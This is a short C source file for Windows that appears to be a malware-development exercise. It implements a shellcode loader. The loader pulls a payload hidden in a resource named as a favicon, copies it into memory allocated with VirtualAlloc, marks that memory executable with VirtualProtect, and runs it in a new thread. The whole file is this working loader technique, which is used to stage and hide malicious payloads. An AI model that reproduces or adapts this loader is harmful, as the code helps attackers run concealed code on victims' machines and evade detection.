/**
    This is the exe that I will be able to use to call
    my dll
    **/

#include <windows.h>
#include <stdio.h> 
#include <stdlib.h>
#include <string.h>
#include "resources.h"





int main(void) {

    printf("here I come");

    getchar();


    void * payload_mem;
    BOOL succseful_mem_change;
    HANDLE thread;
    DWORD oldprotect = 0;
    HGLOBAL resHandle = NULL;
    HRSRC res;

    unsigned char * payload;
    unsigned int payload_len;


    // Get the location of the resource that we are storing the payload in
    res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO),
         RT_RCDATA);

    // Load a handler to that resource
    resHandle = LoadResource(NULL, res);
    
    
    //Convert the handler into an char * and calculate 
    // the length to use it as before
    payload = (char *) LockResource(resHandle);
    payload_len = SizeofResource(NULL, res);




    //Create a memory area we can controle the permisions of
    payload_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | 
        MEM_RESERVE, PAGE_READWRITE);
    
    //copy the payload to the memory
    RtlMoveMemory(payload_mem, payload, payload_len);
    
    printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
    printf("%-20s : 0x%-016p\n", "payload mem addr", (void *)payload_mem);


    //Change the memory to read exicutable in order to run the payload
    succseful_mem_change = VirtualProtect(payload_mem, payload_len, 
        PAGE_EXECUTE_READ, &oldprotect);

    printf("\n ready to rock and roll\n");


    if ( succseful_mem_change ) {
        thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) payload_mem, 0, 0, 0);
        WaitForSingleObject(thread, -1); 
    }


    printf("payload done");



    return 0;

}